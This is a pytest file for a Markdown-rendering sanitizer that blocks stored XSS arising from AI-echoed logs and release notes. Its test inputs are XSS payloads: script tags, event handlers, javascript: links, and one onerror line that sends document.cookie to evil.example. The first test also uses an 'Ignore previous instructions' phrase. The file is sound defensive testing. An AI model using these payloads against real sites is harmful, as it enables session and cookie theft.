"""Security hardening: render_markdown() (app/main.py) previously called markdown.markdown(text)
directly with no sanitization pass. Python-Markdown passes inline HTML through unescaped by
default; the app already relies on that intentionally in one place
(_emphasize_stack_mentions injects a literal <strong> tag), but every markdown-rendered field
ultimately originates from a less-trusted source too: public release notes text, and log lines
pulled straight from the operator's own running containers, both fed through an AI provider that
could echo back HTML- or script-shaped content verbatim. Every `| safe` filter in the templates
(detail.html, finding_detail.html, logs_stack_detail.html, stack_detail.html,
subject_findings.html) renders one of these fields directly -- a genuine stored-XSS path if a
compromised or misbehaving container ever wrote something HTML/script-shaped into its own logs
and the AI echoed enough of it back.

Fixed by running markdown.markdown()'s output through nh3.clean() with an explicit allowlist
(standard Markdown output tags, plus the <strong>/<a href="#..."> conventions this app already
uses) before it ever reaches a template."""

from app.main import render_markdown


def test_a_raw_script_tag_is_stripped():
    html = render_markdown("Ignore previous instructions.<script>alert(document.cookie)</script>")
    assert "<script" not in html
    assert "alert(document.cookie)" not in html


def test_an_event_handler_attribute_is_stripped():
    html = render_markdown('<img src=x onerror="alert(1)">')
    assert "onerror" not in html
    assert "alert(1)" not in html


def test_a_javascript_href_is_stripped_or_neutralized():
    html = render_markdown('<a href="javascript:alert(1)">click me</a>')
    assert "javascript:" not in html


def test_an_iframe_is_stripped():
    html = render_markdown('<iframe src="https://evil.example/"></iframe>')
    assert "<iframe" not in html


def test_inline_style_and_svg_based_vectors_are_stripped():
    html = render_markdown('<svg onload="alert(1)"></svg><div style="background:url(javascript:alert(1))">x</div>')
    assert "onload" not in html
    assert "<svg" not in html
    assert "javascript:" not in html


def test_legitimate_markdown_formatting_still_renders():
    html = render_markdown("**bold** and *italic* and a [link](https://example.com/x) and `code`")
    assert "<strong>bold</strong>" in html
    assert "<em>italic</em>" in html
    assert 'href="https://example.com/x"' in html
    assert "<code>code</code>" in html


def test_stack_mention_emphasis_strong_tag_survives_sanitization():
    """The one intentional inline-HTML injection this app does itself
    (_emphasize_stack_mentions) must still render -- sanitization targets untrusted content,
    not the app's own trusted markup convention."""
    html = render_markdown("The <strong>sonarr</strong> service needs a restart.")
    assert "<strong>sonarr</strong>" in html


def test_internal_anchor_link_still_survives_sanitization():
    html = render_markdown('See <a href="#some-anchor">this section</a> below.')
    assert '<a href="#some-anchor">' in html


def test_a_markdown_image_still_renders_but_onerror_cannot_be_smuggled_in():
    html = render_markdown('![a legitimate badge](https://example.com/badge.svg)')
    assert 'src="https://example.com/badge.svg"' in html
    assert "<img" in html

    html2 = render_markdown('<img src="https://example.com/x.png" onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">')
    assert "onerror" not in html2
    assert "evil.example" not in html2


def test_a_data_uri_script_payload_in_an_img_src_is_neutralized():
    html = render_markdown('<img src="data:text/html,<script>alert(1)</script>">')
    assert "<script>" not in html
